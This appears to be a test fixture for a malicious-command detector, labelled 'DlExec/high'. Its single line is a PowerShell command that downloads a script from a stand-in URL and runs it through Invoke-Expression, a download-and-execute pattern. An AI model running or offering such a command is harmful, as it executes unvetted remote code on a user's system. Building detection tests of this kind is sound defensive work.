# expect: DlExec/high
# url: https://example.com/run.ps1
powershell -Command iex (iwr https://example.com/run.ps1)
